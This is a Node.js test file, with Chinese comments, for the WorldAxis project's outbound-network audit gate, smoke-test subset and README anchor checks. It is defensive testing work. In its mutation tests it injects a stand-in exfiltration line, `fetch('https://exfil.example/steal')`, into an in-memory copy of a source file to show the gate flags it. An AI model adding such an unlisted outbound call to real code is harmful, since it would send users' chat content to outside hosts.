#!/usr/bin/env node
// WorldAxis tests/s3-net-audit-v2204.js — v2.204.0（第一批）专锁：
//   出站面门禁（tools/net-audit.js）+ 两档回归的快档入口（tools/smoke.js）
//   + README 人读锚点（tools/doc-gate.js 的 anchors()）
//
// ── 本批治的三个洞（全部是「体系里真实存在、此前无人盯」的面）────────────
//   ① **出站面零治理**：本仓写侧 / 删侧 / 读侧 / 活性面各有门禁，唯独「新加一行
//      `fetch` / `new WebSocket` / `EventSource`」八道门禁一条都不会响 ——
//      而它在用户那里的含义是「聊天内容可能被发到别处」。
//   ② **每次 commit 与 push 之间是裸奔的**：全量约 29 分钟，于是「改动一行想看结果」
//      要么等半小时、要么不跑；`hooks.js` 的三道秒级门禁**默认没安装**。
//   ③ **给人读的那一处与真源脱节**：README 的「安装」第一步写着「下载 Release 的
//      WorldAxis.zip」而现场 `git tag` 为 0（照做第一步卡死）；版本锚点停在 v2.173.0；
//      「通过 15680 / 失败 0」停在那一轮的读数。
//
// ── 四段结构（与本仓既有专锁同规格）────────────────────────────────────
//   A 段 静态契约：三条单一真源（产品文件面 / 真代码面 / 版本面）+ README 锚点门禁在位
//   B 段 运行时：真跑两个工具的读数，并对**同一件事**做交叉核对（不许各算各的）
//   C 段 只读不变式：连调不变量 + 零写盘（这两个工具都是判据，不是生成器）
//   N 段 真源码破坏 + 两向自证（六组；破坏一律发生在**内存副本**上，原版上判据必须仍真）
//
// ── 为什么 N 段走「加载破坏副本」（H 系列口径）──────────────────────────
//   「判据不恒真」这件事有三种假绿形态（v2.6 记档）：①对原文件断言、破坏没发生也绿；
//   ②破坏被写死成模拟常量，真判据根本没被调用；③破坏把判据自己删了（自我指涉）。
//   故本锁统一用：**真源码破坏（锚点恰中 1 次）→ 在内存里把破坏副本装成模块 →
//   在副本上重跑同一份真判据**。判据永远是产品里的那一份（本锁不重写一份判据）。
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const BASE = path.join(__dirname, '..');
const SELF_REL = 'tests/s3-net-audit-v2204.js';
const NET_REL = 'tools/net-audit.js';
const SMOKE_REL = 'tools/smoke.js';
const HOOKS_REL = 'tools/hooks.js';
const DOC_REL = 'tools/doc-gate.js';
const PRIVACY_REL = 'docs/privacy.md';
const README_REL = 'README.md';
const RUN_REL = 'tests/run.js';
function rd(rel) { return fs.readFileSync(path.join(BASE, rel), 'utf8'); }
function cnt(s, sub) { return String(s).split(sub).length - 1; }
function j(v) { return JSON.stringify(v); }
/**
 * 把一段真源码装成 CommonJS 模块（**破坏副本的载体**）。
 * `require` 走宿主（各工具的 require 用的都是**绝对路径**，与装载位置无关）；
 * `__dirname/__filename` 按仓库内的真实相对位置给 —— 否则被装载的模块会算出错的 BASE。
 */
function loadAsModule(rel, text) {
  let src = (text === undefined) ? rd(rel) : text;
  // shebang 只在**文件首行**合法：装进函数体后会变成 `#!...` 语法错误（实测踩过）。
  src = src.replace(/^#![^\n]*\n/, '');
  const dir = path.join(BASE, path.dirname(rel));
  const file = path.join(BASE, rel);
  const mod = { exports: {} };
  const fn = vm.runInNewContext(
    '(function(module, exports, require, __dirname, __filename){' + src + '\n})',
    { console: console, process: process, Buffer: Buffer, setTimeout: setTimeout, clearTimeout: clearTimeout,
      JSON: JSON, Math: Math, Date: Date, String: String, Array: Array, Object: Object, Number: Number },
    { filename: rel });
  fn(mod, mod.exports, require, dir, file);
  return mod.exports;
}
/** 破坏一个锚点（**必须恰中 1 次**，否则前置失效 —— 不许在 0 命中上继续跑）。 */
function breakAnchor(src, from, to) {
  if (cnt(src, from) !== 1) return { ok: false, n: cnt(src, from) };
  return { ok: true, text: src.split(from).join(to) };
}
/** 只去注释、**保留字符串原文**（本仓既有设备；codeFace 会把字符串抹平，此处不能用它）。 */
function stripComments(src) {
  return String(src).split('\n').map(function (l) {
    const i = l.indexOf('//');
    return i < 0 ? l : l.slice(0, i);
  }).join('\n');
}
/**
 * 负控制锚点表（H5 口径）：每条字面量在本文件**只声明一次**，N 段一律引用这里的条目 ——
 *   在 N 段里再抄一遍字面量，N0 的纯度判据当场就会报双重声明（本锁首跑实测踩过）。
 */
const ANCHOR = {
  probes: "const PROBES = ['fetch(",
  whitelistForm: "forms: ['fetch(']",
  smokeMember: "{ rel: 'tests/module-registry-gate.js', why:",
  fastGates: 'const FAST_GATES = [',
  smokeSet: 'const SMOKE_SET = ['
};
function runAll(a) {
  const N = require(path.join(BASE, NET_REL));
  const S = require(path.join(BASE, SMOKE_REL));
  const D = require(path.join(BASE, DOC_REL));
  const NET = rd(NET_REL), SMOKE = rd(SMOKE_REL), HOOKS = rd(HOOKS_REL);
  const DOC = rd(DOC_REL), README = rd(README_REL), RUN = rd(RUN_REL), SELF = rd(SELF_REL);
  const PRIV = rd(PRIVACY_REL);

  // ════ A 段：静态契约 ══════════════════════════════════════════════
  (function () {
    // ① 单一真源：产品文件面与真代码面都必须**委托**既有真源，不许自带第二份遍历器/剥离器
    a(NET.indexOf("'tests', 'product-files.js'") >= 0 || NET.indexOf('tests/product-files.js') >= 0,
      'v2204/A1: net-audit 的产品文件面**委托** tests/product-files.js（不自己定义「哪些是产品文件」）');
    a(NET.indexOf("'inventory.js'") >= 0 && NET.indexOf('codeFace') >= 0,
      'v2204/A1b: 真代码面**委托** tests/inventory.js 的 codeFace（与清册同一份口径，不另写剥离器）');
    // ⚠ 判据不许自我指涉：「不自己遍历」这条要在**真代码面**上判，而不是在注释里搜词 ——
    //   本工具文件头自己写着「不另写剥离器」，搜词会把那段说明算成实现。
    // 注：这里不能用 codeFace —— 它**把字符串字面量抹成空白**，而本段判的正是
    //   `require(path.join(root, 'tests', 'product-files.js'))` 这类**字符串字面量**。
    //   故用「只去注释、保留字符串」的 stripComments（本仓既有两种剥离器的分工）。
    const netCode = stripComments(NET);
    a(netCode.indexOf('readdirSync') < 0 && netCode.indexOf('withFileTypes') < 0,
      'v2204/A1c: 去注释后，net-audit 里**没有**自己的目录遍历（第二份「产品文件面」的形态）');
    a(netCode.indexOf("'product-files.js'") >= 0 && netCode.indexOf("'inventory.js'") >= 0,
      'v2204/A1d: 两条委托在**执行面**上在场（不是只在注释里被提到）');
    // ② 接缝：两个工具都要能在**内存副本**上被驱动（负控制的前提）
    a(netCode.indexOf('opt.srcOf') >= 0 && netCode.indexOf('opt.faceOf') >= 0,
      'v2204/A2: audit() 保留 srcOf / faceOf 两个读接缝（N 段据此在内存副本上做真破坏）');
    const smokeCode = stripComments(SMOKE);
    a(smokeCode.indexOf('opt.fastGates') >= 0 || smokeCode.indexOf('o.fastGates') >= 0,
      'v2204/A2b: hookSubset() 保留 fastGates 注入（单一真源关系可被两向驱动）');
    a(smokeCode.indexOf('o.set') >= 0,
      'v2204/A2c: verifySet() 保留 set 注入（集自证可被两向驱动）');
    // ③ 出站面口径：形态是**显式封闭表**，不是靠前缀/关键词猜
    a(netCode.indexOf('const PROBES = [') >= 0 && NET.indexOf('sendBeacon') >= 0
      && NET.indexOf('EventSource') >= 0 && NET.indexOf('WebSocket') >= 0 && NET.indexOf('XMLHttpRequest') >= 0,
      'v2204/A3: 出站形态是显式封闭表（fetch / XHR / EventSource / WebSocket / sendBeacon 五形态）');
    a(NET.indexOf('EXT_IMPORT_RE') >= 0 && NET.indexOf('ANY_IMPORT_RE') >= 0,
      'v2204/A3b: 动态 import 按「参数是不是外部 URL」分流（外部 ⇒ egress；同源 ⇒ hostImports 单列）'
      + ' —— 混为一谈会把宿主同源加载报成外呼（首版实测过的假红）');
    a(NET.indexOf('MIN_SITES') >= 0 && NET.indexOf('too-few-sites') >= 0,
      'v2204/A3c: 反空转下限在位（零命中不是「全部合规」——空集上的普遍命题恒真）');
    a(NET.indexOf('stale-whitelist') >= 0,
      'v2204/A3d: 白名单腐烂即红（登记了却零命中 ⇒ 要么改名了、要么外呼挪走了，两种都得让人看见）');
    // ④ 证据面：自证必须点名它依赖的三份真源（缺一份即抛，不许静默降级）
    a(NET.indexOf("'docs/privacy.md'") >= 0, 'v2204/A4: selfTest 点名 docs/privacy.md（承诺书与门禁同批落地）');
    a(PRIV.length > 1000, 'v2204/A4b: docs/privacy.md 非空壳（实 ' + PRIV.length + ' 字符）');
    a(PRIV.indexOf('core/api-router.js') >= 0 && PRIV.indexOf('/scripts/world-info.js') >= 0,
      'v2204/A4c: 隐私页逐条写明两类出站（真出站 2 处 + 宿主同源 import 1 处）——'
      + '与门禁读数同源，不许各写一份');
    // ⑤ 快档集：成员必须是**真存在且有 CLI 入口**的判据（不是「名字好看」）
    a(SMOKE.indexOf(ANCHOR.smokeSet) >= 0 && SMOKE.indexOf('MAX_MS') >= 0,
      'v2204/A5: 快档集与单成员上限都是源码常量（集是产品决策，住在代码里）');
    a(SMOKE.indexOf('require.main === module') >= 0, 'v2204/A5b: smoke 自己有 CLI 入口（能在 pre-commit 与手工路径上跑）');
    a(SMOKE.indexOf('⊆') >= 0 || SMOKE.indexOf('真子集') >= 0,
      'v2204/A5c: 与 hooks.FAST_GATES 的关系**逐字写明**是「真子集」（关系必须可读，不能靠人记）');
    // ⑥ README 人读锚点门禁在位，且三条口径都可机械核对
    a(typeof D.anchors === 'function', 'v2204/A6: doc-gate 导出 anchors()（README 人读锚点这一面是真的判据，不是打印）');
    a(DOC.indexOf('release-claim-without-release') >= 0 && DOC.indexOf('stale-version-anchor') >= 0
      && DOC.indexOf('no-install-entry') >= 0,
      'v2204/A6b: 三条口径齐（版本锚点 / Release↔tag / 安装入口）');
    a(DOC.indexOf('算不出来不得当作算过') >= 0 || DOC.indexOf('算不出来的不冒充判据') >= 0,
      'v2204/A6c: 不判的那一条**如实登记**（「通过 N / 失败 M」要跑 29 分钟全量 ⇒ 不作判据、改指向现场）');
    // ⑦ 本锁自己必须挂在 run.js 上（恰 1 处 —— orphan-lock 的 A 段要求）
    a(cnt(RUN, "runLock('./s3-net-audit-v2204.js')") === 1,
      'v2204/A7: 本锁在 tests/run.js 上恰挂 1 处（实 ' + cnt(RUN, "runLock('./s3-net-audit-v2204.js')") + '）');
    a(RUN.indexOf("require('../tools/test-layers.js')") >= 0,
      'v2204/A7b: run.js 的选区入口仍住在 test-layers（本批只加节，不动分层机制）');
  })();

  // ════ B 段：运行时读数（真跑，并与同源面交叉核对）═════════════════
  (function () {
    const r = N.audit({});
    a(r.ok === true, 'v2204/B1: net-audit 现场全绿（实 ok=' + j(r.ok) + ' · problems='
      + j((r.problems || []).map(function (p) { return p.kind; })) + '）');
    // 扫描面**等于**产品文件面（同一份真源的两次读 ⇒ 数必须相等）
    const pf = require(path.join(BASE, 'tests', 'product-files.js')).productFiles(BASE);
    a(r.files === pf.length && r.files > 100,
      'v2204/B1b: 扫描面 === productFiles() 长度（' + r.files + ' vs ' + pf.length + '）—— 两处各算一份必然漂移');
    a(r.sites.length >= r.minSites && r.minSites >= 2,
      'v2204/B1c: 出站点 ' + r.sites.length + ' 处、下限 ' + r.minSites + '（零命中不许算通过）');
    a(r.sites.every(function (s) { return s.rel === 'core/api-router.js'; }),
      'v2204/B1d: 全部出站点都落在唯一出口 core/api-router.js（实 '
      + j(r.sites.map(function (s) { return s.rel; }).filter(function (v, i, x) { return x.indexOf(v) === i; })) + '）');
    a(r.hostImports.length === 1 && r.hostImports[0].rel === 'engines/worldbook.js'
      && r.hostImports[0].spec === '/scripts/world-info.js',
      'v2204/B1e: 宿主同源 import 恰 1 处且指向 SillyTavern 自己的模块（实 ' + j(r.hostImports) + '）'
      + ' —— 它**单列一档**：不冒充外呼、也不消失');
    // 真代码面口径的**行为证据**：字符串字面量里的 fetch 不算外呼
    const sandboxSrc = rd('core/sandbox.js');
    a(sandboxSrc.indexOf('fetch') >= 0,
      'v2204/B2: core/sandbox.js 里确实有 `fetch` 字样（黑名单声明）—— 前置成立');
    a(r.sites.every(function (s) { return s.rel !== 'core/sandbox.js'; }),
      'v2204/B2b: 但它在读数里**不出站**（字符串字面量是「提及」不是「引用」—— 与 v2.29.0 同规）');
    // 自证：三份真源存在、扫描面非空
    const st = N.selfTest({});
    a(st.ok === true && st.files === r.files && st.sites === r.sites.length,
      'v2204/B2c: selfTest 与 audit 给同一组读数（实 ' + j([st.files, st.sites]) + '）—— 自证不是第二份算法');
    // 快档集：逐成员存在 + 有 CLI 入口
    const v = S.verifySet({});
    a(v.ok === true && v.set.length >= 8, 'v2204/B3: 快档集自证通过（' + v.set.length + ' 个成员 · 实 '
      + j(v.complaints) + '）');
    a(v.rows.filter(function (x) { return x.eased; }).length === 1,
      'v2204/B3b: 无 CLI 守卫的豁免**恰 1 个**且如实登记（不许把「跑得动」当成通行证）');
    a(S.SMOKE_SET.every(function (m) { return fs.existsSync(path.join(BASE, m.rel)); }),
      'v2204/B3c: 集内每个成员在磁盘上真存在（零命中不算通过的那条在这里也适用）');
    // 单一真源：pre-commit 三道必须是快档集的真子集
    const hs = S.hookSubset({});
    a(hs.ok === true, 'v2204/B4: pre-commit 与快档集不分家（实 ' + j(hs.problems) + '）');
    a(hs.gateCount === 3 && hs.setSize === S.SMOKE_SET.length,
      'v2204/B4b: 关系读数（pre-commit ' + hs.gateCount + ' 道 / 集 ' + hs.setSize + ' 个）—— 关系是 ⊆ 不是 ==：'
      + '集**故意**大于 pre-commit');
    a(hs.missing.length === 0 && hs.rows.every(function (x) { return x.inSet === true; }),
      'v2204/B4c: 三道各自的目标文件都在集内（实 ' + j(hs.rows) + '）');
    // 上限是判据的一部分：太松会让快档与全量一样被绕过，太紧会把「动一下就炸」的面挤出去
    a(S.MAX_MS >= 5000 && S.MAX_MS <= 60000,
      'v2204/B4d: 单成员上限 ' + S.MAX_MS + 'ms 落在合理区间（5000–60000）—— 「愿意每次都跑」是这个数的唯一理由');
    // README 人读锚点：三条口径的现场读数
    const an = D.anchors({ read: function (rel) { return rd(rel); }, tags: [] });
    a(an.reason === undefined || an.reason === null || !an.reason,
      'v2204/B5: anchors() 读得到（实 reason=' + j(an.reason) + '）');
    a(an.facts.version === an.facts.readmeVersionAnchor,
      'v2204/B5b: README 版本锚点 === index.js VERSION（实 ' + j([an.facts.readmeVersionAnchor, an.facts.version]) + '）'
      + ' —— 这是④「给人读的那一处与真源脱节」的第一条判据');
    a(an.facts.readmeVersionAnchor !== '2.173.0',
      'v2204/B5c: 锚点不再停在 v2.173.0（本批修的那处脱节不许回退）');
    a(an.facts.claimsRelease === false,
      'v2204/B5d: 安装节**不再**出现「下载 Release」类指令（零 tag 时那条指令是把用户送进死路 —— 本批已删）');
    a(an.facts.installEntry === 'git-clone' || an.facts.installEntry === 'manual-path',
      'v2204/B5e: 且删掉之后**仍有一条真安装路径**（实 ' + an.facts.installEntry + '）—— 两条必须同批，否则用户一条路都没有');
    a(an.ok === true, 'v2204/B5f: 在零 tag 这个真实现场上，三条口径全过（实 ' + j(an.problems) + '）');
    // 交叉核对：README 的 tools/ 名单个数 === 索引里的实际个数（toolchain-gate 的同一件事，这里当场复算一次）
    const idx = require('child_process').execSync('git -C ' + JSON.stringify(BASE) + ' ls-files tools/',
      { encoding: 'utf8' }).split('\n').filter(Boolean).length;
    const cm = README.match(/只有被可执行代码引用（或被门禁链引用）的工具才入库\*\*（(\d+)\s*个/);
    a(cm !== null && Number(cm[1]) === idx,
      'v2204/B6: README 名单自述个数 === git ls-files tools/ 实际（' + (cm && cm[1]) + ' vs ' + idx + '）'
      + ' —— 名单跟着**索引**走，不跟着「本轮改了几个文件」走');
    a(README.indexOf('`net-audit`') >= 0 && README.indexOf('`smoke`') >= 0,
      'v2204/B6b: 两个新工具都在名单里（入库不是终点，名单必须同一轮跟上）');
    a(README.indexOf('（39 个') >= 0 || /（\d+ 个/.test(README),
      'v2204/B6c: 名单句带显式个数（形态门禁按「（N 个」取数，缺了它 count 恒 null）');
  })();

  // ════ C 段：只读不变式（判据不许是生成器，连调不许漂）════════════════
  (function () {
    const r1 = N.audit({});
    const r2 = N.audit({});
    a(JSON.stringify(r1) === JSON.stringify(r2),
      'v2204/C1: net-audit 连调两次逐字节同读数（判据不含墙钟 / 随机源 / 缓存副作用）');
    const v1 = S.verifySet({});
    const v2 = S.verifySet({});
    a(JSON.stringify(v1) === JSON.stringify(v2), 'v2204/C2: verifySet 连调不变量');
    const h1 = S.hookSubset({});
    const h2 = S.hookSubset({});
    a(JSON.stringify(h1) === JSON.stringify(h2), 'v2204/C3: hookSubset 连调不变量');
    const an1 = D.anchors({ tags: [] });
    const an2 = D.anchors({ tags: [] });
    a(JSON.stringify(an1) === JSON.stringify(an2), 'v2204/C4: anchors 连调不变量（tags 注入时不得去跑 git）');
    // 零写盘：这两个工具是**判据**，不许改被取证的文件（--fix 不存在）
    [['net-audit', NET], ['smoke', SMOKE], ['doc-gate', DOC]].forEach(function (p) {
      const c = require(path.join(BASE, 'tests', 'inventory.js')).codeFace(p[1]);
      a(c.indexOf('writeFileSync') < 0 && c.indexOf('appendFileSync') < 0 && c.indexOf('--fix') < 0,
        'v2204/C5(' + p[0] + '): 执行面上零写盘、无 --fix（自动修会让判据变成改产品的人）');
    });
  })();

  // ════ N 段：真源码破坏 + 两向自证 ══════════════════════════════════
  // N0：锚点纯度（每个锚点字面量在**本文件**只声明一次；判据不引用锚点串作期望值）
  (function () {
    const anchors = [ANCHOR.probes, ANCHOR.whitelistForm, ANCHOR.smokeMember, ANCHOR.fastGates, ANCHOR.smokeSet];
    const dup = anchors.filter(function (x) { return cnt(SELF, x) !== 1; });
    a(dup.length === 0, 'v2204/N0: 锚点字面量在本锁中各恰 1 次（违反者 ' + j(dup) + '）');
  })();
  // N1：白名单形态被改窄 ⇒ 现场外呼点变「形态不允许」（判据不是白名单的复读机）
  (function () {
    const b = breakAnchor(NET, ANCHOR.whitelistForm, "forms: ['XMLHttpRequest']");
    if (!b.ok) { a(false, 'v2204/N1a: 白名单形态锚点恰中 1 次（前置失效，实 ' + b.n + '）'); return; }
    const broken = loadAsModule(NET_REL, b.text);
    const bad = broken.audit({});
    const good = N.audit({});
    const kinds = function (r) { return (r.problems || []).map(function (p) { return p.kind; }); };
    a(bad.ok === false && kinds(bad).indexOf('form-not-allowed') >= 0,
      'v2204/N1b: （两向）形态被改窄 ⇒ 现形 form-not-allowed（实 ' + j(kinds(bad)) + '）');
    a(good.ok === true && kinds(good).indexOf('form-not-allowed') < 0,
      'v2204/N1c: （两向）原版上同一条判据**为真**（实 ' + j(kinds(good)) + '）—— 两向区分得开');
  })();
  // N2：探针表被掏空 ⇒ 出站点数塌到下限之下（反空转下限不是装饰）
  (function () {
    const b = breakAnchor(NET, ANCHOR.probes, "const PROBES = ['XMLHttpRequest(");
    if (!b.ok) { a(false, 'v2204/N2a: 探针表锚点恰中 1 次（前置失效，实 ' + b.n + '）'); return; }
    const broken = loadAsModule(NET_REL, b.text);
    const bad = broken.audit({});
    const kinds = (bad.problems || []).map(function (p) { return p.kind; });
    a(bad.ok === false && kinds.indexOf('too-few-sites') >= 0,
      'v2204/N2b: （两向）探针塌了 ⇒ 出站点 < 下限即现形（实 ' + j([bad.sites.length, kinds]) + '）'
      + ' —— 空集上的「全部合规」恒真，这一条是它的守门人');
    a(kinds.indexOf('stale-whitelist') >= 0,
      'v2204/N2c: （两向）同时如实报白名单成孤儿（它登记的那个形态在现场一条都不剩）');
    a(N.audit({}).ok === true, 'v2204/N2d: （两向）原版仍绿 —— 破坏了才红，不是本来就红');
  })();
  // N3：**产品侧真破坏** —— 往真源码副本里塞一行真外呼，门禁必须当场看见
  (function () {
    const isCode = require(path.join(BASE, 'tests', 'inventory.js')).codeFace;
    const real = rd('core/sandbox.js');
    const leaked = real + "\nconst __exfil = fetch('https://exfil.example/steal');\n";
    a(isCode(leaked).indexOf('fetch(') >= 0 && isCode(real).indexOf('fetch(') < 0,
      'v2204/N3a: 破坏在**真代码面**上可见（原版只有字符串里的提及、破坏版是真调用）—— 前置成立');
    const srcOf = function (rel) {
      const t = fs.readFileSync(path.join(BASE, rel), 'utf8');
      return rel === 'core/sandbox.js' ? t + "\nconst __exfil = fetch('https://exfil.example/steal');\n" : t;
    };
    const bad = N.audit({ srcOf: srcOf });
    const unlisted = (bad.problems || []).filter(function (p) { return p.kind === 'unlisted'; })
      .map(function (p) { return p.rel; });
    a(bad.ok === false && unlisted.indexOf('core/sandbox.js') >= 0,
      'v2204/N3b: （两向）塞进未登记的外呼 ⇒ 现形 unlisted：' + j(unlisted) + '（实 ok=' + j(bad.ok) + '）'
      + ' —— 这正是「新加一行 fetch 八道门禁一条都不响」的反面');
    a(N.audit({}).ok === true && bad.sites.length === N.audit({}).sites.length + 1,
      'v2204/N3c: （两向）破坏版只多**一处**出站点，原版一处不多（实 '
      + j([N.audit({}).sites.length, bad.sites.length]) + '）');
  })();
  // N4：FAST_GATES 里加一道不在集内的门禁 ⇒ 关系判据必须现形（两张表分家）
  (function () {
    const b = breakAnchor(HOOKS, ANCHOR.fastGates,
      ANCHOR.fastGates + "\n  { name: 'zzz-orphan-gate', cmd: 'node tests/zzz-orphan-gate.js' },");
    if (!b.ok) { a(false, 'v2204/N4a: FAST_GATES 锚点恰中 1 次（前置失效，实 ' + b.n + '）'); return; }
    const brokenHooks = loadAsModule(HOOKS_REL, b.text);
    const bad = S.hookSubset({ fastGates: brokenHooks.FAST_GATES });
    const missing = (bad.problems || []).filter(function (p) { return p.kind === 'gate-not-in-set'; })
      .map(function (p) { return p.gate; });
    a(bad.ok === false && missing.indexOf('zzz-orphan-gate') >= 0,
      'v2204/N4b: （两向）pre-commit 多一道不在集内的门禁 ⇒ 现形 gate-not-in-set：' + j(missing)
      + ' —— 「pre-commit 说通过、smoke 说不通过」这种自相矛盾从此有判据');
    a(S.hookSubset({ fastGates: JSON.parse(JSON.stringify(require(path.join(BASE, HOOKS_REL)).FAST_GATES)) }).ok === true,
      'v2204/N4c: （两向）原版三道仍绿 —— 判据不是恒假');
  })();
  // N5：快档集里一个成员的路径被打错 ⇒ 同一份判据在另一侧现形（关系是双向可查的）
  (function () {
    const b = breakAnchor(SMOKE, ANCHOR.smokeMember,
      "{ rel: 'tests/module-registry-gate-MOVED.js', why:");
    if (!b.ok) { a(false, 'v2204/N5a: 快档集成员锚点恰中 1 次（前置失效，实 ' + b.n + '）'); return; }
    const broken = loadAsModule(SMOKE_REL, b.text);
    const bad = S.hookSubset({ set: broken.SMOKE_SET });
    const missing = (bad.problems || []).filter(function (p) { return p.kind === 'gate-not-in-set'; })
      .map(function (p) { return p.gate; });
    a(bad.ok === false && missing.indexOf('module-registry') >= 0,
      'v2204/N5b: （两向）集里成员被挪走 ⇒ 同一份判据在**另一侧**现形：' + j(missing));
    // 同时：集自证必须把「路径不存在」如实报成 missing（而不是静默少一个成员照跑）
    const vs = S.verifySet({ set: broken.SMOKE_SET });
    a(vs.ok === false && vs.complaints.some(function (c) { return c.why === 'missing'; }),
      'v2204/N5c: （两向）verifySet 如实报 missing（实 ' + j(vs.complaints) + '）—— 「少一个成员照跑」是本仓最怕的静默降级');
    a(S.verifySet({}).ok === true, 'v2204/N5d: （两向）原版集仍全绿');
  })();
  // N6：README 版本锚点被改回旧值 / Release 声明复辟 ⇒ 三条口径各自独立现形
  (function () {
    const read = function (rel) { return rd(rel); };
    const brokenRead = function (rel) {
      const t = rd(rel);
      if (rel !== README_REL) return t;
      return t.replace(/^##\s*构建与验收（当前版本 v[\d.]+）/m, '## 构建与验收（当前版本 v2.173.0）');
    };
    const bad1 = D.anchors({ read: brokenRead, tags: [] });
    a(bad1.ok === false && (bad1.problems || []).some(function (p) { return p.kind === 'stale-version-anchor'; }),
      'v2204/N6a: （两向）锚点被改回 v2.173.0 ⇒ 现形 stale-version-anchor（实 '
      + j((bad1.problems || []).map(function (p) { return p.kind; })) + '）');
    const brokenRead2 = function (rel) {
      const t = rd(rel);
      if (rel !== README_REL) return t;
      // ⚠ 注入点必须在**安装节内部**：注一个新的 `## 安装` 标题会让切片提前收口，
      //   于是「节里没有 Release 声明」与「节是空的」两种破坏长得一样（首版实测踩过）。
      return t.replace('两条可用路径：', '第一步：下载 Release 的 WorldAxis.zip。两条可用路径：');
    };
    const bad2 = D.anchors({ read: brokenRead2, tags: [] });
    a(bad2.ok === false && (bad2.problems || []).some(function (p) { return p.kind === 'release-claim-without-release'; }),
      'v2204/N6b: （两向）Release 声明复辟（零 tag 现场）⇒ 现形 release-claim-without-release（实 '
      + j((bad2.problems || []).map(function (p) { return p.kind; })) + '）');
    a(typeof read === 'function' && D.anchors({ tags: [] }).ok === true,
      'v2204/N6c: （两向）原版 README 上三条口径全过（实 ' + j(D.anchors({ tags: [] }).problems) + '）'
      + ' —— 破坏只发生在**内存副本**上，真文件逐字未动（见下 N7）');
  })();
  // N7：负控制全程未改真源码（破坏只活在内存储存里）
  (function () {
    const sha = function (rel) {
      return require('crypto').createHash('sha256').update(fs.readFileSync(path.join(BASE, rel))).digest('hex').slice(0, 16);
    };
    const clean = [NET_REL, SMOKE_REL, HOOKS_REL, DOC_REL, README_REL, PRIVACY_REL, SELF_REL];
    // 现场重算一遍与 N 段读到的同一份文本（若有人把破坏写回了盘，这里会立刻不一致）
    [NET_REL, SMOKE_REL, HOOKS_REL].forEach(function (rel) {
      const an = (rel === NET_REL) ? ANCHOR.probes : (rel === SMOKE_REL ? ANCHOR.smokeMember : ANCHOR.fastGates);
      a(breakAnchor(rd(rel), an, 'x').ok === true,
        'v2204/N7: ' + rel + ' 在负控制之后**仍是原版**（锚点仍恰中 1 次 ⇒ 破坏没被写回盘）');
    });
    a(clean.every(function (rel) { return sha(rel).length === 16; })
      && D.anchors({ tags: [] }).ok === true,
      'v2204/N7b: 六份被取证的真文件可读且判据仍绿（负控制没有污染真源码）');
  })();
}
module.exports = { runAll: require(path.join(BASE, 'tests/lock-assert.js')).restoring(runAll) };
if (require.main === module) {
  let pass = 0, fail = 0;
  const a = function (ok, name) { if (ok) { pass++; } else { fail++; console.log('FAIL ' + name); } };
  runAll(a);
  console.log('\ns3-net-audit-v2204 ' + pass + ' / 失败 ' + fail);
  process.exit(fail > 0 ? 1 : 0);
}
